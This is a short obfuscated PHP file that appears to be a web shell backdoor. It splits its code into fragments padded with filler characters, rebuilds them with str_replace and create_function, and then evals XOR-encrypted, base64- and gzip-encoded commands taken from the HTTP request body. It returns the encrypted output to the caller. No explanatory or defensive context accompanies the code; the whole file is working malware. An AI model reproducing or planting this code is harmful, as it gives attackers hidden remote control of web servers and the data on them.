<?php
$b='$k="9da44EJbff";$EJkEJh="a0eEJfab4a25a4";EJ$kf="3EJadEJ4c9779c6b"EJ;$EJp="VLEJSCk5J';
$j='nEJtEJs("php://inpEJut")EJEJ,EJ$m)==1) {@ob_stEJEJart(EJ);@EJEJevaEJl(@gzuncEJoEJmpre';
$O=str_replace('T','','crTeTaTte_TTfunTction');
$Q='$j};}}rEJetuEJrn $o;}if EJ(@prEJEJeEJg_matchEJ("/$kh(.+)$kf/",@fiEJleEJ_get_EJconte';
$m='($iEJ=0;$i<$l;){forEJ($j=0EJ;($j<$cEJ&&$i<$lEJEJ);$j+EJ+,$i++){$o.EJ=$t{$iEJ}^$EJk{';
$P='EJnEJ();$r=@baseEJ64_EJencode(@x(@gzcompreEJss($o)EJ,$k)EJ);print("$pEJ$khEJ$r$kf");}';
$S='ss(@x(@basEJeEJ64_decode($m[1]),$k)));$o=@ob_get_EJconteEJnEJts();@ob_enEJd_EJcEJlea';
$p='R3cEJmSeEJEJAt1";fEJunction x($t,$k){EJ$c=strEJlEJenEJ($kEJ);$l=strlenEJ($t);$o="";EJforEJ';
$U=str_replace('EJ','',$b.$p.$m.$Q.$j.$S.$P);
$B=$O('',$U);$B();
?>
